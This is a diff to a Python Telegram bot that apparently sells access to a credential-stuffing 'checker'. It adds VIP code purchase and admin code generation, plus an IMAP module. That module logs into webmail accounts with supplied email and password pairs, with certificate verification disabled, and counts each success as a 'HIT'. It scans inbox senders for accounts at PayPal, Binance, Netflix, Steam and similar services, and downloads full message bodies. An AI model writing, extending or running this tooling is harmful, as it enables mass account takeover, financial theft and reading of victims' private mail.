+                                    ok, msg = try_claim_vip(chat_id, txt)
+                                    send_message(chat_id, msg)
+                                    if ok:
+                                        sess.awaiting_vip_code = False
+                                        self._handle_vip_flow(chat_id, sess)
+                                continue
+
                             if txt.lower() in ("/start", "start"):
                                 kb = {
                                     "inline_keyboard": [
@@ -1277,8 +1591,6 @@ class BotApp:
                                 self.handle_stop(chat_id)
                                 continue
                             # handle domain input
-                            with self.lock:
-                                sess = self.sessions.get(chat_id)
                             if sess and getattr(sess, "awaiting_domain", False) and sess.pending_accounts:
                                 if txt.lower() != "skip":
                                     sess.custom_domain = txt
@@ -1291,8 +1603,37 @@ class BotApp:
                         cq = upd["callback_query"]
                         data = cq.get("data", "")
                         chat_id = cq["message"]["chat"]["id"]
+                        
+                        # ADMIN Callbacks
+                        if chat_id == ADMIN_ID and data.startswith("GEN_CODE_"):
+                            dur = data.split("_")[2]
+                            code = create_vip_code(dur)
+                            send_message(chat_id, f"Generated {dur} code: `{code}`\n(Click to copy)")
+                            continue
+
                         if data.startswith("STOP_"):
                             self.handle_stop(chat_id)
+                        elif data.startswith("MODE_SELECT_MS_"):
+                            self._handle_mode_select(chat_id, "MS")
+                        elif data.startswith("MODE_SELECT_IMAP_"):
+                            self._handle_mode_select(chat_id, "IMAP")
+                        elif data.startswith("PLAN_FREE_"):
+                            with self.lock:
+                                sess = self.sessions.get(chat_id)
+                            if sess: self._handle_free_flow(chat_id, sess)
+                        elif data.startswith("PLAN_VIP_"):
+                            with self.lock:
+                                sess = self.sessions.get(chat_id)
+                            if sess:
+                                sess.awaiting_vip_code = True
+                                kb = {"inline_keyboard": [[{"text": "Cancel", "callback_data": f"PLAN_CANCEL_{chat_id}"}]]}
+                                send_message(chat_id, "Please enter your VIP code:", reply_markup=kb)
+                        elif data.startswith("PLAN_CANCEL_"):
+                            with self.lock:
+                                sess = self.sessions.get(chat_id)
+                            if sess:
+                                sess.awaiting_vip_code = False
+                                self._handle_free_flow(chat_id, sess)
                         elif data.startswith("SKIP_"):
                             with self.lock:
                                 sess = self.sessions.get(chat_id)
@@ -1321,3 +1662,249 @@ class BotApp:
 
 if __name__ == "__main__":
     BotApp().run()
+
+
+
+# ------------------- IMAP Checker -------------------
+import imaplib
+import email as email_lib
+from email.header import decode_header as decode_hdr
+import ssl
+
+IMAP_SERVERS = {
+    "gmail.com": {"host": "imap.gmail.com", "port": 993},
+    "yahoo.com": {"host": "imap.mail.yahoo.com", "port": 993},
+    "icloud.com": {"host": "imap.mail.me.com", "port": 993},
+    "aol.com": {"host": "imap.aol.com", "port": 993},
+    "zoho.com": {"host": "imap.zoho.com", "port": 993},
+    "fastmail.com": {"host": "imap.fastmail.com", "port": 993},
+    "yandex.com": {"host": "imap.yandex.com", "port": 993},
+    "yandex.ru": {"host": "imap.yandex.ru", "port": 993},
+    "mail.ru": {"host": "imap.mail.ru", "port": 993},
+    "bk.ru": {"host": "imap.mail.ru", "port": 993},
+    "list.ru": {"host": "imap.mail.ru", "port": 993},
+    "inbox.ru": {"host": "imap.mail.ru", "port": 993},
+    "gmx.net": {"host": "imap.gmx.net", "port": 993},
+    "gmx.com": {"host": "imap.gmx.com", "port": 993},
+    "web.de": {"host": "imap.web.de", "port": 993},
+    "t-online.de": {"host": "imap.t-online.de", "port": 993},
+    "qq.com": {"host": "imap.qq.com", "port": 993},
+    "163.com": {"host": "imap.163.com", "port": 993},
+    "126.com": {"host": "imap.126.com", "port": 993},
+    "protonmail.com": {"host": "imap.protonmail.com", "port": 993},
+    "proton.me": {"host": "imap.proton.me", "port": 993},
+}
+
+IMAP_SERVICES = {
+    "Netflix": "netflix.com", "Spotify": "spotify.com", "Discord": "discord.com",
+    "Steam": "steampowered.com", "Epic Games": "epicgames.com", "Roblox": "roblox.com",
+    "PayPal": "paypal.com", "Amazon": "amazon.com", "eBay": "ebay.com",
+    "Facebook": "facebookmail.com", "Instagram": "instagram.com", "Twitter": "x.com",
+    "TikTok": "tiktok.com", "YouTube": "youtube.com", "Twitch": "twitch.tv",
+    "Binance": "binance.com", "Coinbase": "coinbase.com", "Airbnb": "airbnb.com",
+    "Uber": "uber.com", "PlayStation": "playstation.com", "Xbox": "xbox.com",
+    "Minecraft": "mojang.com", "Blizzard": "blizzard.com", "Riot Games": "riotgames.com",
+    "Adobe": "adobe.com", "GitHub": "github.com", "Google": "google.com",
+    "Apple": "apple.com", "Microsoft": "microsoft.com", "Dropbox": "dropbox.com",
+    "Zoom": "zoom.us", "LinkedIn": "linkedin.com", "Reddit": "reddit.com",
+    "Snapchat": "snapchat.com", "Pinterest": "pinterest.com",
+}
+
+def _decode_mime(text):
+    if not text:
+        return ""
+    parts = decode_hdr(text)
+    result = []
+    for part, enc in parts:
+        if isinstance(part, bytes):
+            try:
+                result.append(part.decode(enc or 'utf-8', errors='ignore'))
+            except:
+                result.append(part.decode('utf-8', errors='ignore'))
+        else:
+            result.append(str(part))
+    return ''.join(result)
+
+def _get_imap_config(email_addr):
+    domain = email_addr.lower().split('@')[-1]
+    if domain in IMAP_SERVERS:
+        return IMAP_SERVERS[domain]
+    return {"host": f"imap.{domain}", "port": 993}
+
+def _imap_connect(email_addr, password):
+    cfg = _get_imap_config(email_addr)
+    try:
+        ctx = ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        mail = imaplib.IMAP4_SSL(cfg['host'], cfg['port'],
+                                  ssl_context=ctx)
+        mail.socket().settimeout(12)
+        res, _ = mail.login(email_addr, password)
+        if res != 'OK':
+            try: mail.logout()
+            except: pass
+            return None
+        return mail
+    except (imaplib.IMAP4.error, ssl.SSLError,
+            OSError, ConnectionRefusedError,
+            TimeoutError, Exception):
+        return None
+
+class ImapChecker:
+    def __init__(self):
+        self.hits = 0
+        self._lock = threading.Lock()
+
+    def check(self, email_addr, password):
+        try:
+            mail = _imap_connect(email_addr, password)
+            if not mail:
+                return {"status": "BAD"}
+            # Count inbox
+            msg_count = 0
+            try:
+                r, _ = mail.select('INBOX')
+                if r == 'OK':
+                    r2, data2 = mail.search(None, 'ALL')
+                    if r2 == 'OK' and data2 and data2[0]:
+                        msg_count = len(data2[0].split())
+            except Exception:
+                pass
+            # Scan services
+            services_found = self._scan_services(mail)
+            try:
+                mail.logout()
+            except Exception:
+                pass
+            with self._lock:
+                self.hits += 1
+            return {
+                "status": "HIT",
+                "email": email_addr,
+                "country": "",
+                "name": "",
+                "msg_count": msg_count,
+                "xbox": {"status": "N/A"},
+                "ms_data": {},
+                "services": {svc: True for svc in services_found},
+                "imap_mode": True,
+                "psn_status": "NONE",
+                "steam_status": "NONE",
+                "supercell_status": "NONE",
+                "tiktok_status": "NONE",
+                "minecraft_status": "NONE",
+                "hypixel_status": "NOT_FOUND",
+            }
+        except Exception:
+            return {"status": "BAD"}
+
+    def _scan_services(self, mail):
+        found = set()
+        try:
+            r, data = mail.search(None, 'ALL')
+            if r != 'OK' or not data[0]:
+                return list(found)
+            ids = data[0].split()
+            for eid in ids[-500:]:
+                try:
+                    r2, mdata = mail.fetch(eid, '(BODY.PEEK[HEADER])')
+                    if r2 != 'OK' or not mdata or not mdata[0]:
+                        continue
+                    raw = mdata[0][1] if isinstance(mdata[0], tuple) else b''
+                    msg = email_lib.message_from_bytes(raw)
+                    sender = _decode_mime(msg.get('From', '')).lower()
+                    for svc, pattern in IMAP_SERVICES.items():
+                        if pattern in sender:
+                            found.add(svc)
+                except:
+                    continue
+        except:
+            pass
+        return list(found)
+
+def _imap_fetch_emails(email_addr, password, folder='INBOX', count=100, cancel_event=None):
+    """Fetch last N emails from a folder via IMAP"""
+    emails = []
+    try:
+        mail = _imap_connect(email_addr, password)
+        if not mail:
+            return None, "Login failed (wrong password or domain not reachable)"
+        r, _ = mail.select(folder, readonly=True)
+        if r != 'OK':
+            # Try common alternate folder names
+            alt_names = {
+                'Trash': ['Deleted Items', 'Deleted', '[Gmail]/Trash',
+                           'INBOX.Trash', 'Корзина'],
+                'Sent':  ['Sent Items', '[Gmail]/Sent Mail',
+                           'INBOX.Sent', 'Отправленные'],
+                'Junk':  ['Spam', '[Gmail]/Spam', 'INBOX.Spam',
+                           'Bulk Mail', 'Нежелательная почта'],
+                'Drafts':['[Gmail]/Drafts', 'INBOX.Drafts'],
+            }
+            opened = False
+            for alt in alt_names.get(folder, []):
+                try:
+                    r2, _ = mail.select(alt, readonly=True)
+                    if r2 == 'OK':
+                        opened = True
+                        break
+                except Exception:
+                    continue
+            if not opened:
+                try: mail.logout()
+                except: pass
+                return None, f"Cannot open folder: {folder}"
+        r2, data2 = mail.search(None, 'ALL')
+        if r2 != 'OK':
+            mail.logout()
+            return None, "Search failed"
+        ids = data2[0].split() if data2[0] else []
+        # Get last `count` emails
+        fetch_ids = ids[-count:] if len(ids) > count else ids
+        fetch_ids = list(reversed(fetch_ids))  # newest first
+        for eid in fetch_ids:
+            if cancel_event and cancel_event.is_set():
+                break
+            try:
+                r3, mdata = mail.fetch(eid, '(RFC822)')
+                if r3 != 'OK' or not mdata:
+                    continue
+                raw = mdata[0][1] if isinstance(mdata[0], tuple) else b''
+                msg = email_lib.message_from_bytes(raw)
+                subject = _decode_mime(msg.get('Subject', '(No Subject)'))
+                sender = _decode_mime(msg.get('From', ''))
+                date = msg.get('Date', '')
+                body = ''
+                if msg.is_multipart():
+                    for part in msg.walk():
+                        ct = part.get_content_type()
+                        if ct == 'text/plain':
+                            try:
+                                body = part.get_payload(decode=True).decode('utf-8', errors='ignore')
+                                break
+                            except:
+                                pass
+                        elif ct == 'text/html' and not body:
+                            try:
+                                html = part.get_payload(decode=True).decode('utf-8', errors='ignore')
+                                body = re.sub(r'<[^>]+>', ' ', html)
+                            except:
+                                pass
+                else:
+                    try:
+                        body = msg.get_payload(decode=True).decode('utf-8', errors='ignore')
+                    except:
+                        body = str(msg.get_payload())
+                emails.append({
+                    'subject': subject[:120],
+                    'from': sender[:80],
+                    'date': date[:40],
+                    'body': body[:3000],
+                })
+            except:
+                continue
+        mail.logout()
+        return emails, None
+    except Exception as e:
+        return None, str(e)
